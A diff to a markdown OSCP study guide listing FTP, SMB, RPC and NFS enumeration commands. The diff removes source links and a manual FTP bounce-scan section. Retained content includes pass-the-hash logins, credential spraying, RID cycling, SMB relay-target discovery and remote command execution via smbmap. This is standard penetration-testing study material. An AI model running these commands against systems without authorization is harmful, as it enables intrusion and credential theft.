@@ -26,7 +26,6 @@ nc -nv <IP> 21
 telnet -vn <IP> 21
 ```
 Grabs the FTP daemon's welcome banner (often reveals exact version, e.g. `vsFTPd 2.3.4`, `ProFTPD 1.3.5`) for offline exploit-search. HackTricks recommends `telnet` over `nc` because FTP's line terminator is `0x0d 0x0a`.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/README.md
 
 **2. Unauthenticated `HELP`/`FEAT` enumeration**
 ```
@@ -35,7 +34,6 @@ ftp <IP>
 > FEAT
 ```
 Lists supported commands/extensions (e.g. `AUTH TLS`, `MLSD`, `EPSV`) without authenticating — useful for daemon fingerprinting when the banner is suppressed.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/README.md
 
 **3. Anonymous login check (manual)**
 ```bash
@@ -47,7 +45,6 @@ ftp> binary     # switch to binary transfer mode
 ftp> bye
 ```
 Standard credential triad to test: `anonymous:anonymous`, `anonymous:<blank>`, `ftp:ftp`.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/README.md
 
 **Write access test after anonymous login:**
 ```bash
@@ -63,7 +60,6 @@ nxc ftp <IP> -u anonymous -p anonymous
 nxc ftp <IP> -u users.txt -p passwords.txt   # credential/anon spray across a list
 ```
 NetExec ships a dedicated `ftp` protocol module (`--port`, `--ls`, `--get`, `--put`) supporting the same `-u`/`-p` credential-check pattern used for SMB/RDP/WinRM/SSH/LDAP elsewhere in this file — a one-liner equivalent of the manual anonymous-login check above.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec/main/nxc/protocols/ftp/proto_args.py
 
 **4. Anonymous login via browser/wget (bulk download)**
 ```bash
@@ -71,14 +67,12 @@ wget -m ftp://anonymous:anonymous@10.10.10.98          # mirror everything, PASV
 wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98   # if PASV is disabled
 ```
 Recursively mirrors the entire accessible FTP tree in one shot — faster than manual `mget` when you already know anon access works.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/README.md
 
 **5. nmap default script anon/bounce check (already part of `-sC`)**
 ```bash
 nmap -sC -sV -p21 <IP>
 ```
 Anonymous-login and FTP-bounce checks (`ftp-anon`, `ftp-bounce`) are part of the `default` NSE category and run automatically with `-sC`. Don't re-run these separately if `-sC` already ran.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/README.md
 
 **6. Dedicated FTP NSE sweep (script family, not always covered by `-sC`/`--script vuln`)**
 ```bash
@@ -95,47 +89,7 @@ Runs every `ftp-*` NSE script. Individually useful ones for OSCP:
 - `ftp-vuln-cve2010-4221` — ProFTPD 1.3.2rc3–1.3.3b stack overflow (categories: `intrusive,vuln` — this one IS in `vuln` category)
 Source (script descriptions, verified from nmap source tree): https://github.com/nmap/nmap/tree/master/scripts (individual `.nse` files, e.g. https://raw.githubusercontent.com/nmap/nmap/master/scripts/ftp-syst.nse )
 
-**7. FTP bounce attack — manual (PORT/EPRT abuse for internal port scanning)**
-```
-PORT 172,32,80,80,31,144      # target 172.32.80.80:8080  (31*256+144=8080)
-EPRT |1|172.32.80.80|8080|    # IPv4 extended syntax
-EPRT |2|2001:db8::80|8080|    # IPv6
-LIST                          # or NLST / RETR /file to trigger data connection
-```
-`150`/`125` response ⇒ port open (bounce succeeded, connect worked from the FTP server's perspective); `425` ⇒ closed/filtered. Lets you scan hosts only reachable *from* the FTP server (SSRF-style internal pivot).
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/ftp-bounce-attack.md
-
-**8. FTP bounce — nmap automated**
-```bash
-nmap -Pn -v -p 21,80 -b ftp:ftp@10.2.1.5 127.0.0.1        # scan the FTP server itself via bounce
-nmap -v -p 21,22,445,80,443 -b ftp:ftp@10.2.1.5 192.168.0.1/24   # scan internal network via bounce
-nmap -p21 --script ftp-bounce <ftp_server>
-nmap -p21 --script ftp-bounce --script-args 'ftp-bounce.username=<user>,ftp-bounce.password=<pass>,ftp-bounce.checkhost=<target>' <ftp_server>
-```
-`-b` is nmap's native FTP-bounce scan mode: `user:pass@ftp-server`. The NSE `ftp-bounce` script defaults to anonymous/`IEUser@` and `scanme.nmap.org` as the check host — override `checkhost` to point at your real internal target.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/ftp-bounce-attack.md
-
-**9. FTP bounce — Metasploit alternative**
-```
-use auxiliary/scanner/portscan/ftpbounce
-set BOUNCEHOST <ftp_server>
-set RHOSTS <victim>
-set PORTS 22,80,443,445,8080,8443
-set FTPUSER <user>
-set FTPPASS <pass>
-run
-```
-Good for a quick IPv4 sweep; does not support IPv6 (use manual `EPRT` for that). **Exam caveat: on the OSCP exam, Metasploit (including this module) may only be run against the single machine you've designated for Metasploit use, and never used to scan or pivot toward other hosts — treat this as reference-only unless that condition is met; the manual `EPRT`/`PORT` sequence and `nmap -b` above are the exam-safe defaults.**
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/ftp-bounce-attack.md
-
-**10. Config-file hunting after a foothold**
-```
-ftpusers
-ftp.conf
-proftpd.conf
-```
-Look for `AllowForeignAddress on` (ProFTPD) or `port_promiscuous=YES` (vsftpd) — confirms bounce/FXP is intentionally enabled.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/README.md and https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-ftp/ftp-bounce-attack.md
+FTP bounce scanning (`nmap -b`, manual `PORT`/`EPRT`, Metasploit `ftpbounce`) is rarely seen on OSCP targets — the NSE `ftp-bounce` script in `-sC` already checks for it. Skip the full manual bounce workflow unless you specifically find a bounce-enabled server on an internal network.
 
 ### FTP Tools Table
 
@@ -146,7 +100,6 @@ Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/
 | `wget` | Bulk-download anonymous FTP tree | `wget -m ftp://anonymous:anonymous@<IP>` |
 | `nmap` NSE (`ftp-*`) | Anon/bounce/backdoor/version checks | `nmap -p21 --script "ftp-*" -sV <IP>` |
 | `netexec` (nxc) | Fast anon/credential check, one-liner spray | `nxc ftp <IP> -u anonymous -p anonymous` |
-| Metasploit `ftpbounce` | Bounce-scan internal hosts | `use auxiliary/scanner/portscan/ftpbounce` |
 
 ---
 
@@ -163,7 +116,6 @@ nbtscan -r 192.168.0.1/24
 nmblookup -A <IP>
 ```
 `nbtscan` maps live NetBIOS hosts + their names across a subnet; `nmblookup -A` resolves the NetBIOS name table of a single host (workgroup, machine name, MAC via `__MSBROWSE__`).
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
 
 **2. SMB version / dialect / signing fingerprint (nmap NSE — often skipped by beginners running only `-sC`/`vuln`)**
 ```bash
@@ -194,7 +146,6 @@ nmap -p445 --script smb-enum-services --script-args smbusername=<user>,smbpasswo
 - `smb-enum-sessions` — who is logged in locally or connected to a share; arguably the most useful for a pentester per nmap's own docs.
 - `smb-enum-services`/`smb-enum-processes` — requires admin creds; lists running services/processes via remote registry.
 None of these are part of `--script vuln`; only some (like basic share listing) overlap `-sC`'s `default` category weakly — always run this family explicitly for full coverage.
-Source: https://raw.githubusercontent.com/nmap/nmap/master/scripts/smb-enum-shares.nse, smb-enum-users.nse, smb-enum-groups.nse, smb-enum-domains.nse, smb-enum-sessions.nse, smb-enum-services.nse, smb-enum-processes.nse
 
 **4. Misc nmap SMB utility scripts**
 ```bash
@@ -203,14 +154,12 @@ nmap -p445 --script smb-server-stats --script-args smbusername=<user>,smbpasswor
 nmap -p445 --script smb-ls --script-args smbusername=<user>,smbpassword=<pass>,smb-ls.share=<share> <IP>  # ls-style share file listing
 nmap -p445 --script smb-mbenum <IP>                  # queries Windows Master Browser info
 ```
-Source: https://raw.githubusercontent.com/nmap/nmap/master/scripts/smb-system-info.nse, smb-server-stats.nse, smb-ls.nse, smb-mbenum.nse
 
 **5. Full local-workgroup SMB signing sweep (relay-target discovery, nmap alternative to nxc)**
 ```bash
 nmap --script smb-security-mode.nse,smb2-security-mode.nse -p445 <subnet>
 ```
 Cross-reference against `nxc --gen-relay-list` output below.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/smb-signing-not-required.md
 
 **6. smbclient — list shares (null / guest / creds)**
 ```bash
@@ -220,7 +169,6 @@ smbclient -U 'username[%passwd]' -L //<IP>                      # creds; omit pw
 smbclient -U 'username%passwd' -L //<IP> --pw-nt-hash            # pass-the-hash (NT hash as "password")
 smbclient -N //<IP>/ --option="client min protocol"=LANMAN1     # force legacy dialect for old boxes
 ```
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
 
 **7. smbclient — connect to a specific share / recursive download**
 ```bash
@@ -232,7 +180,6 @@ smb: \> prompt            # turn off per-file confirmation
 smb: \> mget *            # download everything matching mask, recursively
 ```
 The `mask ""; recurse; prompt; mget *` combo is the standard "download the whole share" one-liner.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
 
 **8. smbclient — manual share-name brute force (when listing is blocked)**
 ```bash
@@ -240,14 +187,12 @@ smbclient -U '%' -N \\\\<IP>\\<SHARE>       # null session against a guessed sha
 smbclient -U '<USER>' \\\\<IP>\\<SHARE>     # authenticated session
 ```
 Try common names: `C$ D$ ADMIN$ IPC$ PRINT$ FAX$ SYSVOL NETLOGON`. Distinguish `NT_STATUS_ACCESS_DENIED` (share exists, no access) from `NT_STATUS_BAD_NETWORK_NAME` (share doesn't exist) even when list-shares is disabled.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
 
 **9. smbclient — Kerberos auth**
 ```bash
 smbclient --use-kerberos=required //ws01win10.domain.com/C$
 ```
 Samba 4.15+ replaced the standalone `--kerberos` long flag with the tri-state `--use-kerberos=desired|required|off` (`-k` is kept only as a deprecated short-flag alias); modern Kali ships well past 4.15, so bare `--kerberos` will be rejected as unrecognized.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md ; https://raw.githubusercontent.com/samba-team/samba/master/docs-xml/manpages/smbclient.1.xml
 
 **10. smbmap — basic + credentialed enumeration**
 ```bash
@@ -260,7 +205,6 @@ smbmap -R -u "username" -p "password" -H <IP>            # recursive listing of 
 smbmap -r <Folder> -H <IP> -u user -p pass                # non-recursive listing of a specific folder
 ```
 `-s <SHARE>` targets a single share (default `C$`); `-d <DOMAIN>` sets domain (default `WORKGROUP`); omitting `-u` assumes a null session.
-Source: https://raw.githubusercontent.com/ShawnDEvans/smbmap/master/README.md and https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
 
 **11. smbmap — search/download/execute**
 ```bash
@@ -271,7 +215,6 @@ smbmap -u user -p pass -H <IP> -x 'net group "Domain Admins" /domain'   # RCE vi
 smbmap -u user -p pass -H <IP> --admin                # quick check: is this account local admin?
 smbmap -u user -p pass -H <IP> --signing              # check SMB signing enabled/disabled/required
 ```
-Source: https://raw.githubusercontent.com/ShawnDEvans/smbmap/master/README.md
 
 **12. enum4linux (legacy Perl, still on the OSCP exam VM) — full and targeted runs**
 ```bash
@@ -284,7 +227,6 @@ enum4linux -o <IP>                        # OS information
 enum4linux -i <IP>                        # printer information
 enum4linux -u <user> -p <pass> -a <IP>    # authenticated full enum
 ```
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md and https://github.com/CiscoCXSecurity/enum4linux (README + `enum4linux.pl` usage banner)
 
 **13. enum4linux-ng (Python rewrite; default on modern Kali) — flags**
 ```bash
@@ -302,7 +244,6 @@ enum4linux-ng.py -r 500-550,1000-1050 -R <target>          # custom RID ranges f
 enum4linux-ng.py -As -oY out <target>                      # export findings as YAML (also -oJ / -oA)
 ```
 Key OSCP-relevant differences from `enum4linux.pl`: RID cycling is opt-in (`-R`), group members aren't pulled by default (need `-Gm`), and it supports NTLM-hash auth (`-H`) and Kerberos ticket auth (`-K`).
-Source: https://raw.githubusercontent.com/cddmp/enum4linux-ng/master/README.md
 
 **14. rpcclient — session setup (null / credentialed / PtH)**
 ```bash
@@ -312,7 +253,6 @@ rpcclient -U "username%password" <IP>                                  # authent
 rpcclient //machine.htb -U 'domain.local/USERNAME%<NTHASH>' --pw-nt-hash   # pass-the-hash
 rpcclient -k ws01win10.domain.com                                        # Kerberos
 ```
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
 
 **15. rpcclient — user enumeration**
 ```
@@ -324,7 +264,6 @@ queryusergroups 0x<rid>           # groups a user belongs to
 queryuseraliases builtin|domain <sid>  # aliases for a user
 lookupnames <username>             # resolve username -> SID
 ```
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
 
 **16. rpcclient — group / alias / domain enumeration**
 ```
@@ -337,7 +276,6 @@ enumdomains                        # list domains
 lsaquery                            # get domain SID
 querydominfo                        # domain info (incl. password policy fields)
 ```
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
 
 **17. rpcclient — share enumeration**
 ```
@@ -345,7 +283,6 @@ netshareenumall                    # list all shares
 netsharegetinfo <share>             # detail on one share
 enumprinters; netshareenumall       # printer + share enum in one -c call
 ```
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/rpcclient-enumeration.md and https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
 
 **18. rpcclient — SID/RID cycling (manual, LSARPC)**
 ```
@@ -360,7 +297,6 @@ for i in $(seq 500 1100); do
 done
 ```
 Cycles well-known RID ranges (500–1100 covers most built-in + early custom accounts) to enumerate usernames even when `enumdomusers` is blocked.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/rpcclient-enumeration.md and https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
 
 **19. rpcclient — extra reference commands**
 | Command | Interface | Description |
@@ -369,7 +305,6 @@ Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/
 | `dsenumdomtrusts` | LSARPC-DS | Enumerate trusted domains in the forest |
 | `createdomuser` / `deletedomuser` | SAMR | Create/delete a domain user (requires privs) |
 | `lsaaddacctrights` / `lsaremoveacctrights` | LSARPC | Add/remove rights on a user account |
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/rpcclient-enumeration.md
 
 **20. Impacket alternatives for user/RPC enumeration**
 ```bash
@@ -377,7 +312,6 @@ samrdump.py -port 445 [[domain/]username[:password]@]<target>
 rpcdump.py -port 135 [[domain/]username[:password]@]<target>
 lookupsid.py -no-pass <hostname.local>                # local user RID enumeration
 ```
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
 
 **21. Null session enumeration — the canonical 3-tool combo**
 ```bash
@@ -393,14 +327,12 @@ nxc smb <IP> -u '' -p '' --users
 nxc smb <IP> -u '' -p '' --groups
 ```
 A blank-user/blank-pass ("null") session on the `IPC$` pipe. On a DC without RestrictAnonymous hardening this alone can dump users, groups, and password policy. Good HTB/OSCP-style practice targets for this: Forest, Monteverde.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-null-sessions.md
 
 **22. netexec (nxc) — host discovery / OS+signing fingerprint**
 ```bash
 nxc smb 192.168.1.0/24
 ```
 Sweeps a range, printing hostname, OS build, domain/workgroup, `signing:` state, and `SMBv1:` support for every live SMB host in one pass.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-hosts.md
 
 **23. netexec (nxc) — guest logon check**
 ```bash
@@ -408,14 +340,12 @@ nxc smb 10.10.10.178 -u 'a' -p ''
 nxc smb 10.10.10.178 -u 'a' -p '' --shares
 ```
 Fake username + empty password tests whether the domain/local Guest account is enabled. (2025+ nxc builds can auto-detect this with no creds at all if `check_guest_account` is set `true` in `~/.nxc/nxc.conf`.) Good practice target: HTB Nest.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-guest-logon.md
 
 **24. netexec (nxc) — SMB signing sweep (relay-target list)**
 ```bash
 nxc smb 192.168.1.0/24 --gen-relay-list relay_list.txt
 ```
 Outputs one IP per line for every host where `signing:False`, i.e. every host vulnerable to SMB relay.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/smb-signing-not-required.md
 
 **25. netexec (nxc) — shares enumeration + ACL/permission filter**
 ```bash
@@ -425,20 +355,17 @@ nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --shares READ
 nxc smb 192.168.1.0/24 -u user -p 'PASSWORDHERE' --shares WRITE
 ```
 Lists every share plus your effective READ/WRITE permission on each — described by the maintainers as "by far one of the most useful features of nxc."
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-shares-and-access.md
 
 **26. netexec (nxc) — disks**
 ```bash
 nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --disks
 ```
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-disks.md
 
 **27. netexec (nxc) — domain users**
 ```bash
 nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --users
 nxc smb <IP> -u UserName -p 'PASSWORDHERE' --users-export output.txt   # dump usernames straight to a file for spraying
 ```
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-domain-users.md
 
 **28. netexec (nxc) — RID brute (RID cycling)**
 ```bash
@@ -446,7 +373,6 @@ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --rid-brute
 nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --rid-brute 10000   # custom max RID
 ```
 Automates the manual `rpcclient lookupsids` loop shown above — this is nxc's built-in RID-cycling module.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-users-by-bruteforcing-rid.md
 
 **29. netexec (nxc) — local groups and domain groups**
 ```bash
@@ -454,13 +380,11 @@ nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --local-groups
 nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --groups
 ```
 `--groups` (SMB module) still enumerates domain groups directly — verified current against `nxc/protocols/smb/proto_args.py` in the NetExec source. The LDAP module also exposes its own `--groups` (`nxc ldap <target> -u u -p p --groups`) as an alternate path, not a replacement.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-local-groups.md and https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-domain-groups.md ; https://raw.githubusercontent.com/Pennyw0rth/NetExec/main/nxc/protocols/smb/proto_args.py
 
 **30. netexec (nxc) — password policy**
 ```bash
 nxc smb 192.168.1.0/24 -u UserName -p 'PASSWORDHERE' --pass-pol
 ```
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-domain-password-policy-1.md
 
 **31. netexec (nxc) — sessions / logged-on users**
 ```bash
@@ -470,21 +394,18 @@ nxc smb $TARGET/24 -u $USER -p $PASSWORD --reg-sessions 'admin_user' # filter by
 nxc smb $TARGET/24 -u $USER -p $PASSWORD --reg-sessions './users.txt'  # filter by list of usernames
 ```
 `--reg-sessions` only indicates the user has a login context (primary token) on the box, **not** necessarily an active interactive session — don't assume it's safe to impersonate for lateral movement modules like `schtask_as` without further checks.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-logged-on-users-winreg.md (and module names confirmed against nxc source: `nxc/protocols/smb.py`)
 
 **32. netexec (nxc) — network interfaces (admin-only)**
 ```bash
 nxc smb 192.168.56.11 -u USERNAME -p 'PASSWORDHERE' --interfaces
 ```
 Requires local admin; enumerates NICs on the target — useful for finding dual-homed pivot boxes.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec-Wiki/main/smb-protocol/enumeration/enumerate-network-interfaces.md
 
 **33. netexec (nxc) — the "run everything" one-liner**
 ```bash
 nxc smb <IP or domain> -u '<username>' -p '<password>' --groups --local-groups --loggedon-users --rid-brute --smb-sessions --users --shares --pass-pol
 ```
 Chains group, local-group, logged-on-users, RID-brute, sessions, users, shares, and password-policy modules in a single authenticated pass.
-Source: https://gist.github.com/strikoder/99635df00444bbf5fc90ca83ec8051a0 (community NXC cheat sheet; cross-check individual flags against the official wiki pages above)
 
 **34. crackmapexec (legacy name, same syntax family, still referenced/aliased on older exam images)**
 ```bash
@@ -496,18 +417,15 @@ crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --sessions
 crackmapexec smb <IP> -d <DOMAIN> -u Administrator -p 'password' --disks
 crackmapexec smb <IP> -d <DOMAIN> -u Administrator -H <NTHASH> --shares      # pass-the-hash
 ```
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
 
 **35. nmap `smb-brute` (credential brute-force NSE, distinct from generic vuln scan)**
 ```bash
 nmap --script smb-brute -p445 <IP>
 ```
 Not part of `-sC` or `--script vuln`; intrusive — mentioned here for completeness but flagged in HackTricks as "not recommended" due to lockout risk.
-Source: https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/network-services-pentesting/pentesting-smb/README.md
 
 **36. `smb-vuln-*` — for reference, these ARE covered by generic `--script vuln`/manual CVE scans (do not duplicate)**
 `smb-vuln-ms17-010`, `smb-vuln-ms08-067`, `smb-vuln-cve2009-3103`, `smb-vuln-ms06-025`, `smb-vuln-ms07-029`, `smb-vuln-ms10-054`, `smb-vuln-ms10-061`, `smb-vuln-conficker`, `smb-vuln-cve-2017-7494` (SambaCry), `smb-vuln-regsvc-dos`, `smb-vuln-webexec`, `smb-double-pulsar-backdoor`. Listed here only so you know NOT to re-add them to a "manual enumeration not covered by vuln scan" checklist — they belong to the vulnerability-scanning phase, not enumeration.
-Source: https://raw.githubusercontent.com/nmap/nmap/master/scripts/script.db and https://raw.githubusercontent.com/nmap/nmap/master/scripts/smb-vuln-ms17-010.nse
 
 ### SMB/NetBIOS Tools Table
 
@@ -539,12 +457,7 @@ Source: https://raw.githubusercontent.com/nmap/nmap/master/scripts/script.db and
 
 ---
 
-**File locations note:** No files were written for this research — everything above is the direct deliverable per your no-report-file instruction. If you'd like this converted into a polished, printable study-guide artifact (HTML/PDF) or a `.md` file in your OSCP repo, let me know and I'll produce it.
----
 ## RPC, NFS, and LDAP Enumeration
-
-## Topic
-Manual enumeration techniques for RPC (portmapper/MSRPC), NFS, and LDAP services in OSCP-style penetration testing engagements, covering `rpcinfo`/`rpcclient`, `showmount`/NFS mounting (including techniques beyond `no_root_squash`), and LDAP anonymous bind enumeration via `ldapsearch`, `windapsearch`, and `ldapdomaindump`.
 
 ## Overview
 These three services are recurring OSCP/PWK enumeration targets because they frequently expose information — or full read/write access — without authentication:
@@ -571,21 +484,18 @@ Queries the portmapper (rpcbind, TCP/UDP 111) on the target and lists every regi
     100003    3   tcp   2049  nfs
     100021    1   udp  34104  nlockmgr
 ```
-Source: [rpcinfo man page — Linux Command Library](https://linuxcommandlibrary.com/man/rpcinfo); [Red Hat Storage Administration Guide — NFS and rpcbind](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/storage_administration_guide/s2-nfs-methodology-portmap)
 
 **2. Nmap RPC enumeration as a companion/alternative to rpcinfo**
 ```
 nmap -sV --script=rpcinfo -p 111 <target-ip>
 ```
 Useful when the portmapper is firewalled on 111 but rpcinfo's raw UDP/TCP probe is blocked while nmap's NSE variant (or a source-port-111 trick) still gets through.
-Source: [rpcclient Enumeration – 0xma](https://0xma.github.io/hacking/rpcclient_enumeration.html)
 
 **3. Open a null session with rpcclient**
 ```
 rpcclient -U "" -N <target-ip>
 ```
 `-U ""` supplies an empty (anonymous) username, `-N` suppresses the password prompt so no credential is sent at all — this is the SMB/MSRPC equivalent of an NFS anonymous mount and is the entry point for every command below. On Samba/Linux targets the equivalent anonymous form is `rpcclient -U '%' <target-ip>` (empty user, empty password separated by `%`).
-Source: [kb/rpcclient — lanjelot](https://github.com/lanjelot/kb/blob/master/rpcclient)
 
 **4. Enumerate domain users**
 ```
@@ -596,7 +506,6 @@ or chained non-interactively:
 rpcclient -U "" -N <target-ip> -c "enumdomusers"
 ```
 Lists every domain user account with its RID; combine with `queryuser 0x<RID>` to pull full account detail (bad password count, last logon, account flags) for a specific user.
-Source: [rpcclient enumeration — HackTricks (via search index)](https://hacktricks.wiki/en/network-services-pentesting/pentesting-smb/rpcclient-enumeration.html); [rpcclient Enumeration – 0xma](https://0xma.github.io/hacking/rpcclient_enumeration.html)
 
 **5. Enumerate domain groups and group membership**
 ```
@@ -605,7 +514,6 @@ rpcclient $> querygroup 0x<RID>
 rpcclient $> queryusergroups 0x<user-RID>
 ```
 `enumdomgroups` lists group names/RIDs; `querygroup` returns a group's detail; `queryusergroups` reverses the lookup to show what groups a given user RID belongs to.
-Source: [RPC and RPCClient Enumeration Cheat Sheet — vespersec](https://vespersec.net/docs/network-enumeration-and-scanning/rpc-and-rpcclient-enumeration-cheat-sheet/)
 
 **6. Pull domain and password-policy info without credentials**
 ```
@@ -613,7 +521,6 @@ rpcclient $> querydominfo
 rpcclient $> getdompwinfo
 ```
 `querydominfo` returns domain name/SID, user/group counts, and server role; `getdompwinfo` returns the password policy (min password length, lockout parameters) — directly usable to size a password-spraying attempt without triggering a lockout.
-Source: [Active Directory Enumeration with RPCClient — Hacking Articles](https://www.hackingarticles.in/active-directory-enumeration-rpcclient/)
 
 **7. Resolve SIDs and names (RID cycling groundwork)**
 ```
@@ -622,7 +529,6 @@ rpcclient $> lookupnames <username>
 rpcclient $> lookupsids <SID>
 ```
 `lsaquery` returns the domain SID; `lookupnames` resolves a known username to its SID; `lookupsids` resolves a SID back to a name — chaining `lsaquery` + a RID-brute loop of `lookupsids S-1-5-21-...-500`, `-501`, `-1000`... is the classic manual "RID cycling" technique when `enumdomusers` is restricted.
-Source: [rpcclient Enumeration – 0xma](https://0xma.github.io/hacking/rpcclient_enumeration.html); [RPC and RPCClient Enumeration Cheat Sheet — vespersec](https://vespersec.net/docs/network-enumeration-and-scanning/rpc-and-rpcclient-enumeration-cheat-sheet/)
 
 **8. Enumerate shares and server info**
 ```
@@ -631,14 +537,12 @@ rpcclient $> netshareenum
 rpcclient $> netshareenumall
 ```
 `srvinfo` gives OS/server type; `netshareenum`/`netshareenumall` list SMB shares (including hidden `$` shares) reachable via the same null session, complementing `smbclient -L`.
-Source: [RPC and RPCClient Enumeration Cheat Sheet — vespersec](https://vespersec.net/docs/network-enumeration-and-scanning/rpc-and-rpcclient-enumeration-cheat-sheet/)
 
 **9. Enumerate privileges**
 ```
 rpcclient -U "" -N <target-ip> -c "enumprivs"
 ```
 Lists all privileges known to the LSA on the box — useful context when chaining to token-privilege-abuse post-exploitation.
-Source: [OSCP Enumeration Cheatsheet — CertCube](https://blog.certcube.com/oscp-enumeration-cheatsheet/)
 
 ---
 
@@ -649,7 +553,6 @@ Source: [OSCP Enumeration Cheatsheet — CertCube](https://blog.certcube.com/osc
 showmount -e <target-ip>
 ```
 Queries mountd directly and lists every export path the host advertises plus the client ACL for each (e.g. `*`, a CIDR, or a specific host) — always run this before attempting a mount, since it also reveals which exports are world-mountable.
-Source: [2049 - Pentesting NFS Service — HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting); [Enumerating NFS Shares (Port 2049) — Infinite Logins](https://infinitelogins.com/2020/12/12/enumerating-nfs-shares-port-2049/)
 
 **Faster (nxc):**
 ```bash
@@ -657,21 +560,18 @@ nxc nfs <target-ip> --shares          # equivalent to showmount -e
 nxc nfs <target-ip> --enum-shares     # recursively enumerate exposed shares (default depth 3)
 ```
 NetExec ships a dedicated `nfs` protocol module (`--shares`, `--enum-shares`, `--ls`, `--get-file`, `--put-file`, `--chmod`) — a fast-triage alternative/companion to the manual `showmount` + mount workflow below.
-Source: https://raw.githubusercontent.com/Pennyw0rth/NetExec/main/nxc/protocols/nfs/proto_args.py
 
 **11. List currently connected/mounted clients**
 ```
 showmount -a <target-ip>
 ```
 Shows `host:directory` pairs of who currently has each export mounted — helpful for identifying a live client whose UID you may want to impersonate, or to check if your own probe mount registered.
-Source: [Enumerating NFS Shares (Port 2049) — Infinite Logins](https://infinitelogins.com/2020/12/12/enumerating-nfs-shares-port-2049/)
 
 **12. List the raw directory export list (no client info)**
 ```
 showmount -d <target-ip>
 ```
